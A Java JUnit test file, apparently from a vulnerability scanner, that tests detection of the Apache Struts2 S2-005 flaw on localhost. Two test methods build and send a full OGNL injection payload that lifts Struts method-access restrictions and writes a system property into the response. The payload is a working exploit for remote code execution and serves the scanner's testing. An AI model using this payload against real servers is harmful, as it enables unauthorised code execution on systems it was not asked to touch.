package com.shaobing.wallaby.core.http.j2ee;

import com.shaobing.wallaby.common.enums.Platform;
import com.shaobing.wallaby.common.http.httpclient.HttpUtils;
import com.shaobing.wallaby.core.jscan.apache.ApacheS2005ScanTask;
import com.shaobing.wallaby.core.jscan.common.PreambleInfo;
import com.shaobing.wallaby.core.jscan.common.ScanIssue;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.nio.client.CloseableHttpAsyncClient;
import org.apache.http.impl.nio.client.HttpAsyncClients;
import org.apache.http.util.EntityUtils;
import org.junit.Test;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

/**
 * @author luyb@servyou.com.cn
 * @version $$: TestApacheS2005.java v 0.1 2016/12/1 13:17 luyb Exp $$
 */
public class TestApacheS2005 {

    @Test
    public void testUrl() throws MalformedURLException {
        String desUrl = "http://localhost:8080?name=123";

        URL url = new URL(desUrl);
        System.out.println(url.getQuery());

    }

    @Test
    public void apcheS200501() throws MalformedURLException, URISyntaxException {
        String key = "java.version"; //os.name
        String desUrl = "http://localhost:8080/s2/test/hello.action?";
        String urlStr = desUrl
                        + "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(@java.lang.System@getProperty(%22"
                        + key + "%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
        //解决方案 http://blog.163.com/shrimp_wy/blog/static/1912435302012925248969/
        URL url = new URL(urlStr);
        URI uri = new URI(url.getProtocol(), url.getUserInfo(), url.getHost(), url.getPort(),
            url.getPath(), url.getQuery(), null);

        try {
            CloseableHttpClient httpclient = HttpClients.createDefault();
            HttpGet httpGet = new HttpGet(uri);

            httpGet.setHeader("connection", "keep-alive");
            CloseableHttpResponse response1 = httpclient.execute(httpGet);
            System.out.println(response1.getAllHeaders());
            System.out.println(response1.getStatusLine());
            System.out.println(response1.getEntity().toString());
            HttpEntity entity = response1.getEntity();

            BufferedReader reader = new BufferedReader(
                new InputStreamReader(entity.getContent(), "UTF-8"));

            StringBuilder sb = new StringBuilder();
            String s;
            while ((s = reader.readLine()) != null) {
                sb.append(s).append(System.getProperty("line.separator"));
            }
            reader.close();
            System.out.println(s);

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
        }

        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
        try {
            // Start the client
            httpclient.start();

            // Execute request
            final HttpGet request1 = new HttpGet(uri);
            request1.setHeader("Transfer-Encoding", "chunked");
            Future<HttpResponse> future = httpclient.execute(request1, null);
            // and wait until a response is received
            HttpResponse response1 = future.get();
            System.out.println(request1.getRequestLine() + "->" + response1.getStatusLine());


            HttpEntity httpEntity = response1.getEntity();
            if (httpEntity != null) {
                try {
                    String body = EntityUtils.toString(httpEntity, "UTF-8");
                    System.out.println(body);
                } catch (IOException e) {
                }
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (ExecutionException e) {
            e.printStackTrace();
        } finally {
        }

    }

    @Test
    public void testApacheS2005() {
        try {
            String key = "java.version"; //os.name
            key = "os.name";
            String desUrl = "http://localhost:8080/s2/test/hello.action?";
            String urlStr = desUrl
                            + "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(@java.lang.System@getProperty(%22"
                            + key + "%22))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";
            System.out.println(HttpUtils.get(urlStr, null, "UTF-8"));
            TimeUnit.SECONDS.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
        }
    }

    @Test
    public void testApacheS200501() {
        String url = "http://localhost:8080/s2/test/hello.action";

        ApacheS2005ScanTask apacheS2005ScanTask = new ApacheS2005ScanTask();
        PreambleInfo preambleInfo = new PreambleInfo();
        preambleInfo.setPlatform(Platform.WINDOWS);
        List<ScanIssue> scanIssues = apacheS2005ScanTask.execute(url, preambleInfo, null);
        System.out.println(scanIssues);

    }


}
